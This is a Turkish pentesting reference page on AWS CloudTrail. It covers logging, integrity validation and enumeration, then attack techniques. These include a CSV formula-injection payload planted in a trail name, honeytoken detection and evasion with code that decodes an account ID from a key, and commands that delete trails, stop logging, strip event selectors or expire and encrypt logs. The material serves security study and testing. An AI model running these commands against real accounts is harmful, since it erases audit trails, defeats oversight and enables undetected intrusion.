# AWS - CloudTrail Enum

{{#include ../../../../banners/hacktricks-training.md}}

## **CloudTrail**

AWS CloudTrail **AWS ortamınızdaki etkinlikleri kaydeder ve izler**. Tüm AWS kaynaklarıyla etkileşimler için kimin ne yaptığını, ne zaman ve nereden yaptığını içeren ayrıntılı **olay günlüklerini** yakalar. Bu, değişikliklerin ve eylemlerin bir denetim izini sağlar, güvenlik analizi, uyum denetimi ve kaynak değişiklik takibi konusunda yardımcı olur. CloudTrail, kullanıcı ve kaynak davranışını anlamak, güvenlik duruşunu artırmak ve düzenleyici uyumu sağlamak için gereklidir.

Her kaydedilen olay şunları içerir:

- Çağrılan API'nin adı: `eventName`
- Çağrılan hizmet: `eventSource`
- Zaman: `eventTime`
- IP adresi: `SourceIPAddress`
- Ajan yöntemi: `userAgent`. Örnekler:
- Signing.amazonaws.com - AWS Yönetim Konsolu'ndan
- console.amazonaws.com - Hesabın kök kullanıcısı
- lambda.amazonaws.com - AWS Lambda
- İstek parametreleri: `requestParameters`
- Yanıt öğeleri: `responseElements`

Olaylar, **yaklaşık her 5 dakikada bir JSON dosyasında** yeni bir günlük dosyasına yazılır, CloudTrail tarafından tutulur ve nihayetinde günlük dosyaları **yaklaşık 15 dakika sonra S3'e teslim edilir**.\
CloudTrail günlükleri **hesaplar ve bölgeler arasında birleştirilebilir.**\
CloudTrail, **günlük dosyası bütünlüğünü kullanmanıza olanak tanır, böylece günlük dosyalarınızın CloudTrail tarafından size teslim edildiğinden beri değişmediğini doğrulayabilirsiniz.** Günlüklerin içinde bir özet dosyasında SHA-256 hash oluşturur. Yeni günlüklerin sha-256 hash'i her saat başı oluşturulur.\
Bir Trail oluştururken olay seçicileri, kaydedilecek izi belirtmenize olanak tanır: Yönetim, veri veya içgörü olayları.

Günlükler bir S3 kovasında saklanır. Varsayılan olarak Sunucu Tarafı Şifreleme (SSE-S3) kullanılır, bu nedenle AWS, buna erişimi olan kişiler için içeriği şifre çözer, ancak ek güvenlik için SSE'yi KMS ve kendi anahtarlarınızla kullanabilirsiniz.

Günlükler, **bu ad formatında bir S3 kovasında saklanır**:

- **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
- BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
- Örnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasörün içinde her günlük, **bu formatı takip eden bir isme sahip olacaktır**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Günlük Dosyası İsimlendirme Konvansiyonu

![](<../../../../images/image (122).png>)

Ayrıca, **dosya bütünlüğünü kontrol etmek için (digest dosyaları)** **aynı kovada** bulunacaktır:

![](<../../../../images/image (195).png>)

### Birden Fazla Hesaptan Günlükleri Birleştirme

- Günlük dosyalarının teslim edileceği AWS hesabında bir Trail oluşturun
- Hedef S3 kovasına, CloudTrail için çapraz hesap erişimine izin veren izinler uygulayın ve erişime ihtiyaç duyan her AWS hesabına izin verin
- Diğer AWS hesaplarında yeni bir Trail oluşturun ve 1. adımda oluşturulan kovayı kullanmayı seçin

Ancak, tüm günlükleri aynı S3 kovasında saklayabilseniz de, birden fazla hesaptan CloudTrail günlüklerini tek bir AWS hesabına ait CloudWatch Logs'a birleştiremezsiniz.

> [!CAUTION]
> Bir hesabın **farklı Trails** CloudTrail **etkin** olarak aynı (veya farklı) günlükleri farklı kovalarda saklayabileceğini unutmayın.

### Tüm organizasyon hesaplarından 1'e CloudTrail

Bir CloudTrail oluştururken, organizasyondaki tüm hesaplar için cloudtrail'i etkinleştirmek ve günlükleri sadece 1 kovaya almak için belirtmek mümkündür:

<figure><img src="../../../../images/image (200).png" alt=""><figcaption></figcaption></figure>

Bu şekilde, tüm hesapların tüm bölgelerinde CloudTrail'i kolayca yapılandırabilir ve günlükleri 1 hesapta (korumanız gereken) merkezi hale getirebilirsiniz.

### Günlük Dosyalarını Kontrol Etme

Günlüklerin değiştirilmediğini kontrol edebilirsiniz.
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### Logs to CloudWatch

**CloudTrail, şüpheli aktiviteler gerçekleştirildiğinde sizi uyaran uyarılar ayarlayabilmeniz için logları otomatik olarak CloudWatch'a gönderebilir.**\
CloudTrail'in logları CloudWatch'a gönderebilmesi için bir **rol** oluşturulması gerektiğini unutmayın. Mümkünse, bu işlemleri gerçekleştirmek için AWS varsayılan rolünün kullanılması önerilir. Bu rol, CloudTrail'in:

- CreateLogStream: CloudWatch Logs log akışları oluşturmasına izin verir
- PutLogEvents: CloudTrail loglarını CloudWatch Logs log akışına iletmesine izin verir

### Event History

CloudTrail Event History, kaydedilen logları bir tabloda incelemenizi sağlar:

![](<../../../../images/image (89).png>)

### Insights

**CloudTrail Insights**, CloudTrail yollarından yazma yönetim olaylarını otomatik olarak **analiz eder** ve size **olağandışı aktiviteler** hakkında **uyarıda bulunur**. Örneğin, belirlenen temel değerlerden farklı olarak `TerminateInstance` olaylarında bir artış varsa, bunu bir Insight olayı olarak göreceksiniz. Bu olaylar, **olağandışı API aktivitelerini bulmayı ve yanıt vermeyi her zamankinden daha kolay hale getirir**.

Insights, CloudTrail loglarının bulunduğu aynı kovada saklanır: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>Logların değiştirilip değiştirilmediğini (değiştirilmiş veya silinmiş) doğrulayın</li><li><p>Her dosya için hash oluşturmak amacıyla digest dosyaları kullanır</p><ul><li>SHA-256 hashing</li><li>Digital imza için SHA-256 ile RSA</li><li>Amazon'a ait özel anahtar</li></ul></li><li>Bir digest dosyası oluşturmak 1 saat sürer (her saat başında yapılır)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>IAM politikaları ve S3 kova politikaları kullanın</p><ul><li>güvenlik ekibi —> yönetici erişimi</li><li>denetçiler —> yalnızca okuma erişimi</li></ul></li><li>Logları şifrelemek için SSE-S3/SSE-KMS kullanın</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>IAM ve kova politikaları ile silme erişimini kısıtlayın</li><li>S3 MFA silme yapılandırması yapın</li><li>Log File Validation ile doğrulayın</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor, son 400 gün boyunca AWS **CloudTrail loglarına dayanarak içgörülerini toplar**. CloudTrail, bir AWS hesabında yapılan AWS API çağrılarının ve ilgili olayların tarihini kaydeder. Access Advisor, bu verileri kullanarak **hizmetlerin en son ne zaman erişildiğini gösterir**. CloudTrail loglarını analiz ederek, Access Advisor bir IAM kullanıcısının veya rolünün hangi AWS hizmetlerine eriştiğini ve bu erişimin ne zaman gerçekleştiğini belirleyebilir. Bu, AWS yöneticilerinin **izinleri iyileştirme** konusunda bilinçli kararlar almasına yardımcı olur; çünkü uzun süre erişilmeyen hizmetleri tanımlayabilir ve gerçek kullanım desenlerine dayalı olarak aşırı geniş izinleri azaltabilirler.

> [!TIP]
> Bu nedenle, Access Advisor **kullanıcılara verilen gereksiz izinler hakkında bilgi verir** böylece yönetici bunları kaldırabilir

<figure><img src="../../../../images/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Enjeksiyonu**

CloudTrail içinde, günlükler CSV formatında dışa aktarıldığında ve Excel ile açıldığında rastgele kod çalıştıracak bir CVS enjeksiyonu gerçekleştirmek mümkündür.\
Aşağıdaki kod, yükü içeren kötü bir Trail adıyla günlük girişi oluşturacaktır:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla bilgi için CSV Enjeksiyonları hakkında sayfayı kontrol edin:

{{#ref}}
https://book.hacktricks.xyz/pentesting-web/formula-injection
{{#endref}}

Bu spesifik teknik hakkında daha fazla bilgi için [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Algılama Atlatma**

### HoneyTokens **atlatma**

Honeytoken'lar, **hassas bilgilerin sızdırılmasını tespit etmek için** oluşturulmuştur. AWS durumunda, bunlar **kullanımı izlenen AWS anahtarlarıdır**, eğer bu anahtarla bir eylem tetiklenirse, o zaman birisi bu anahtarı çalmış olmalıdır.

Ancak, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) tarafından oluşturulan Honeytoken'lar ya tanınabilir hesap adı kullanıyor ya da tüm müşterileri için aynı AWS hesap kimliğini kullanıyor. Bu nedenle, eğer Cloudtrail herhangi bir günlük oluşturmadan hesap adını ve/veya hesap kimliğini alabilirseniz, **anahtarın bir honeytoken olup olmadığını bilebilirsiniz**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam__detect_honeytokens/main.py#L57) bazı kurallara sahiptir, bu kurallar bir anahtarın [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**'e ait olup olmadığını tespit etmek için:**

- Eğer **`canarytokens.org`** rol adında görünüyorsa veya hata mesajında **`534261010715`** hesap kimliği görünüyorsa.
- Daha yakın zamanda test ettiklerinde, **`717712589309`** hesabını kullanıyorlar ve hala adında **`canarytokens.com`** dizesi var.
- Eğer hata mesajında rol adında **`SpaceCrab`** görünüyorsa
- **SpaceSiren**, kullanıcı adları oluşturmak için **uuids** kullanır: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
- Eğer **isim rastgele üretilmiş gibi görünüyorsa**, bunun bir HoneyToken olma olasılığı yüksektir.

#### Anahtar Kimliğinden Hesap Kimliğini Almak

**Erişim anahtarının** içinde **kodlanmış** olarak **Hesap Kimliğini** alabilirsiniz, [**burada açıklandığı gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) ve hesap kimliğini Honeytoken AWS hesaplarınızın listesiyle kontrol edebilirsiniz:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Daha fazla bilgi için [**orijinal araştırmaya**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) bakın.

#### Log oluşturmayın

Bunun için en etkili teknik aslında basit bir tekniktir. Bulduğunuz anahtarı kullanarak kendi saldırgan hesabınızdaki bir hizmete erişin. Bu, **CloudTrail'in KENDİ AWS hesabınızda bir log oluşturmasını sağlar ve kurbanın hesabında değil**.

Sorun şu ki, çıktı bir hata gösterecek ve hesap ID'sini ve hesap adını belirtecek, böylece **bir Honeytoken olup olmadığını görebileceksiniz**.

#### Log olmadan AWS hizmetleri

Geçmişte bazı **AWS hizmetleri CloudTrail'e log göndermiyordu** (burada bir [liste bulabilirsiniz](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Bu hizmetlerden bazıları, yetkisiz (honeytoken anahtarı) birinin erişmeye çalışması durumunda **hata** ile **anahtar rolünün ARN'sini** içeren bir **yanıt** verecektir.

Bu şekilde, bir **saldırgan herhangi bir log tetiklemeksizin anahtarın ARN'sini elde edebilir**. ARN'de saldırgan **AWS hesap ID'sini ve adını** görebilir, bu nedenle HoneyToken'ın şirket hesap ID'lerini ve adlarını bilmek kolaydır, böylece bir saldırgan token'ın bir HoneyToken olup olmadığını belirleyebilir.

![](<../../../../images/image (93).png>)

> [!CAUTION]
> CloudTrail logları oluşturmayan tüm kamu API'lerinin artık düzeltildiğini unutmayın, bu nedenle belki de kendi API'lerinizi bulmanız gerekebilir...
>
> Daha fazla bilgi için [**orijinal araştırmaya**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) bakın.

### Üçüncü Altyapıya Erişim

Belirli AWS hizmetleri **veritabanları** veya **Kubernetes** kümeleri (EKS) gibi **bazı altyapılar oluşturacaktır**. Bir kullanıcı **bu hizmetlerle doğrudan konuştuğunda** (Kubernetes API'si gibi) **AWS API'sini kullanmaz**, bu nedenle CloudTrail bu iletişimi göremez.

Bu nedenle, EKS'ye erişimi olan bir kullanıcı EKS API'sinin URL'sini keşfettiyse, yerel olarak bir token oluşturabilir ve **CloudTrail tarafından tespit edilmeden API hizmetiyle doğrudan konuşabilir**.

Daha fazla bilgi için:

{{#ref}}
../../aws-post-exploitation/aws-eks-post-exploitation.md
{{#endref}}

### CloudTrail Yapılandırmasını Değiştirme

#### İzleri Sil
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### İzleri Durdur
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Çok bölgeli günlüğü devre dışı bırakın
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Olay Seçicileri ile Günlüğü Devre Dışı Bırakma
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
İlk örnekte, tek bir olay seçici, tek bir nesne ile JSON dizisi olarak sağlanmıştır. `"ReadWriteType": "ReadOnly"` ifadesi, **olay seçicinin yalnızca salt okunur olayları yakalaması gerektiğini** belirtir (bu nedenle CloudTrail içgörüleri **örneğin yazma** olaylarını kontrol etmeyecek).

Olay seçiciyi belirli gereksinimlerinize göre özelleştirebilirsiniz.

#### S3 yaşam döngüsü politikası aracılığıyla günlüklerin silinmesi
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
### Bucket Konfigürasyonunu Değiştirme

- S3 bucket'ını sil
- Bucket politikasını CloudTrail hizmetinden gelen yazmaları reddedecek şekilde değiştir
- S3 bucket'ına nesneleri silmek için yaşam döngüsü politikası ekle
- CloudTrail günlüklerini şifrelemek için kullanılan kms anahtarını devre dışı bırak

### Cloudtrail ransomware

#### S3 ransomware

**Asimetrik bir anahtar oluşturabilir** ve **CloudTrail'in verileri** o anahtarla şifrelemesini sağlayabilir ve **özel anahtarı silerek** CloudTrail içeriğinin kurtarılamayacak hale gelmesini sağlayabilirsin.\
Bu temelde **S3-KMS ransomware** olarak açıklanmaktadır:

{{#ref}}
../../aws-post-exploitation/aws-s3-post-exploitation.md
{{#endref}}

**KMS ransomware**

Bu, önceki saldırıyı farklı izin gereksinimleriyle gerçekleştirmenin en kolay yoludur:

{{#ref}}
../../aws-post-exploitation/aws-kms-post-exploitation.md
{{#endref}}

## **Referanslar**

- [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{{#include ../../../../banners/hacktricks-training.md}}
